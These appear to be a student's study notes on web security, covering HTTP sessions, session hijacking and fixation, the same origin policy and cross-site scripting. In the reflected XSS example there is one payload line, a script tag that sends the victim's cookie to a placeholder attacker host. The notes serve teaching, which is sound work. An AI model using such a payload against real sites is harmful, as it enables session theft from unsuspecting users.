## intro

>[!summary] basic web infrastructure
>
>![[web-infrastructure.png|center|500]]
> Standard Client-Server model. The web browser initiates a `page request`. The web server receives it and processes it via one of two paths:
> 1. static content (left) ⟶ the server spawns a worker to simply fetch an HTML file from storage.
> 2. dynamic content (right) ⟶ the server spawns an interpreter to execute a script. This script often queries a DB to retrieve data and generate the page content before sending the `server response` back


>[!info] URL structure
>
>![[URL-structure.png|center|500]]
>
>  the characters `:/?#[]@!$&'()*+,;=` are "not allowed" (reserved) since hey have a standardised meaning; to use them for other purposes, they have to be percent-encoded (`%` + two hexadecimal digits)

## HTTP
to see the basics of how HTTP works, see [[4 - HTTP#HTTP|HTTP]] .

### dynamic contents to HTTP requests
servers and clients use **scripting** languages to create **dynamic content** for web users
- **client-side scripting**: downloaded from the server and executed *on the client’s computer*, completely visible and readable to the user
	- can access the resources the browser is given permission to see (eg cookies or local storage)
	- e.g. javascript, VBscript, ActiveX, Ajax
- **server-side scripting**: executed entirely *on the web server*, before the final result is sent back to the client’s browser 
	- PHP, ASP.NET, Java, Perl, Ruby, Go, Python, server-side javascript like node.js

### HTTP authentication
HTTP authentication is rarely used nowadays; the process is:
1. the browser starts a request without sending any client-side credentials
2. the server replies with a status message: `401 Unauthorized`, with a specific `WWW-Authenticate` header containing information on the authentication method; the browser then prompts the user for credentials
3. the browser gets the client’s credentials, includes them in the `Authorization` header and sends it back to the server (either base64-encoded or hashed with the username, password, (other things), and a nonce (random, one-time value))

### monitoring and manipulating HTTP
HTTP payload is cleartext encapsulated in TCP packets (with default port `80`), so it's easy to monitor and manipulate
- it can be monitored through sniffing tools (eg wireshark)
- it can be manipulated through traditional browsers and extensions, via proxy, curl and more

### HTTP sessions
HTTP is stateless, so every request is independent from the previous ones; but dynamic web applications require the ability to maintain some kind of session
- HTTP sessions are implemented by web application themselves, and session information is transmitted between the client and the server via:
	- HTTP payloads `<INPUT TYPE="hidden NAME="sessionid VALUE="7456">`
	- URLs `http://www.example/com/page.php?sessionid=7456`
	- HTTP headers (eg cookies) 
```http
GET /page.php HTTP/1.1
Host: www.example.com
...
Cookie: sessionid=7456
```

(for more info, see [[4 - HTTP#cookie|cookies]])

#### session attacks
- **session hijacking** ⟶ the attacker "steals" the user's session ID and sends a request to the web server as if they were the user
![[session-hijacking.png|center|450]]

- **session prediction** ⟶ early php implementations of sessions were susceptible to session prediction, as the total effective randomness was reduced from 160 bits down to only 40 or even 20 bits (1milion cookies, not that much) if the attacker could pre-compute or know certain values
- **session fixation** ⟶ the attacker sets the victim's session ID before the victim logs in (the attacker sends a link containing the session ID to the victim)
![[session-fixation.png|center|450]]

---
Session cookies can be used in **Insecure Direct Object Reference**s 
An **IDOR** occurs when a web application exposes a direct reference to an internal implementation object, such as a file, directory, or database key, and the application fails to verify that the requesting user is authorized to access that object.
## content isolation & the "same origin" policy
Most of the browser's security machanisms rely on the possibility of *isolating documents* (and execution contexts) depending on the resource's origin (generally, different websites or sources shouldn't access each other's content)
- a malicious website cannot run scripts that access data and functionalities of other websites visited by the user (*cross-site scripting*)

This is part of the **Same Origin Policy** (SOP), an essential security concept for web browsers, designed to isolate documents from different websites.

> [!summary] SOP "rules"
> - a website cannot read or modify cookies or other DOM (represents the page as a tree of objects, essentially acting as a bridge between scripts and the web page's structure/content in the browser) elements of other websites
> - actions like "modify content of another window" should always require a security check
> - a website can request a resource from another website, but can't process the received data
> - actions like "follow a link" should always be allowed
> - any 2 scripts executed in 2 given execution contexts can access their DOMs iff the *protocol*, *domain name* and *port* of their host document are the same
> 
> ![[SOP.png|center|500]]

SOP's simplicity is also its limit:
- we can't isolate homepages of different users hosted on the same protocol+domain+port
- different domains cannot easily interact among each other if legitimately needed
	- solution: `document.domain` can be used to relax the SOP by reducing domain definitions to its parent domains, matching other sibling subdomains that do the same (both scripts can set their top level domain as their domain control)
		- issue: allows communication among other subdomains (eg. `google.com` and `mobile.google.com`)
	- more secure solution: `postMessage()` allows scripts to send messages between windows located on completely different origins in a controlled and safe manner (allows both the sender and the receiver to agree on the communication boundaries)

## client-side attacks
Client-side attacks **exploit the trust of the browser** (as opposite to exploiting the trust of servers). 

More specifically, the trust of
- a user towards a website (*XSS*)
- a website towards a user (*CSRF*)

Once the attacker's code runs in the victim's browser, the goals can include:
- *stealing the cookie* associated with the vulnerable domain
- *login form manipulations* (e.g., redirecting the user's credentials to an attacker-controlled server).
- Execution of *additional GET/POST requests* (e.g., changing the user's password or transferring money).

### Cross-Site Scripting (XSS)
XSS targets the user's application. Its goal is *unauthorised access to information* stored on the client's browser (or other unauthorised actions).

The main steps are usually:
1.  HTML/js code is injected in a web page, exploiting a **lack of input sanitization** to make it run
2. the client’s brower executes any code and renders any HTML present on the vulnerable page

There are different *types of XSS*:
- **reflected XSS** ⟶ the injection happens in a parameter used by the page to *dynamically display information* 

>[!example] example 
> ![[reflected-XSS.png|center|600]]
> the vulnerability is that the website's response script that directly echoes the user’s `keyword` parameter into the HTML response, without any sanitization or encoding
>- the attacker crafts a malicious link (to the vulnerable site) containing the XSS payload, that is designed to read the cookie and make a request to the attacker’s server. in this case, the payload is:
>```html
><script>window.location='http://attacker/cookie' + document.cookie</script>
>```
>- the attacker sends the URL to the victim, that executes it sending a GET request to the vulnerable site with the malicious payload
>- the vulnerable site executes its vulnerable response script, concatenating the raw, uninvalidated payload into the HTML response
>	- while it can make sense to echo the search result for client-side logging/tracking, but it should be escaped (escaping characters like `<>"'^&`)
>- when the victim’s browser receives the response, it starts rendering the page. when it gets to the `<script>` tag, it executes the code immediately, sending a GET request to the attacker’s server with its cookie as a parameter


- **stored XSS** ⟶ the injection is *stored in a page* of the web application (typically a DB) - attacks users accessing it
- **DOM-based XSS** ⟶ the injection happens in a *parameter used by a script* running within the page itself
